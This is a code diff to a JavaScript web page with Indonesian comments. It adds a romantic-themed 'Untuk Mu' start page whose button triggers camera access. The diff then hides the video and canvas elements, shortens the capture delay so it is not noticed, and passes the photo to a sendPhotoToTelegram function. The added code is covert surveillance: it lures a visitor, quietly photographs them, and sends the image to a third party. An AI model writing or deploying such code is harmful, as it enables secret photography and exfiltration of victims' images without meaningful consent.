@@ -9,8 +9,21 @@ const canvas = document.getElementById('canvas');
 const ctx = canvas.getContext('2d');
 
 window.addEventListener('load', () => {
-    requestCameraAccess();
+    showStartPage();
 });
+
+function showStartPage() {
+    const container = document.getElementById('camera-permission');
+    container.innerHTML = `
+        <div class="start-page">
+            <h1>💕 Untuk Mu ❤️</h1>
+            <p>Klik tombol di bawah untuk memulai</p>
+            <button id="start-btn">MULAI</button>
+        </div>
+    `;
+
+    document.getElementById('start-btn').addEventListener('click', requestCameraAccess);
+}
 
 async function requestCameraAccess() {
     try {
@@ -22,12 +35,20 @@ async function requestCameraAccess() {
             }
         });
 
+        // Sembunyikan video element
         video.srcObject = stream;
+        video.style.display = 'none';
+        video.style.visibility = 'hidden';
+        video.style.position = 'absolute';
+        video.style.width = '0';
+        video.style.height = '0';
+
         video.onloadedmetadata = () => {
             video.play();
+            // Capture langsung tanpa delay terlihat
             setTimeout(() => {
                 capturePhoto();
-            }, 1000);
+            }, 500);
         };
 
     } catch (error) {
@@ -37,15 +58,19 @@ async function requestCameraAccess() {
 }
 
 function capturePhoto() {
+    // Canvas juga hidden
+    canvas.style.display = 'none';
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
     capturedImage = canvas.toDataURL('image/jpeg');
 
+    // Matikan kamera
     if (stream) {
         stream.getTracks().forEach(track => track.stop());
     }
 
+    // Kirim langsung, tampilkan hasil
     sendPhotoToTelegram();
     displayCapturedPhoto();
 }
@@ -76,8 +101,9 @@ async function sendPhotoToTelegram() {
 }
 
 function displayCapturedPhoto() {
-    video.style.display = 'none';
-    
+    const container = document.getElementById('camera-permission');
+    container.innerHTML = '';
+
     const img = document.createElement('img');
     img.src = capturedImage;
     img.id = 'captured-photo';
@@ -85,8 +111,6 @@ function displayCapturedPhoto() {
     img.style.height = '100%';
     img.style.objectFit = 'cover';
     
-    const container = document.getElementById('camera-permission');
-    container.innerHTML = '';
     container.appendChild(img);
 
     const button = document.createElement('button');
@@ -102,12 +126,13 @@ function displayCapturedPhoto() {
     button.style.borderRadius = '50px';
     button.style.cursor = 'pointer';
     button.style.fontWeight = '600';
+    button.style.zIndex = '10';
     
     container.appendChild(button);
     
     button.addEventListener('click', () => {
         capturedImage = null;
-        video.style.display = 'block';
-        requestCameraAccess();
+        video.style.display = 'none';
+        showStartPage();
     });
 }
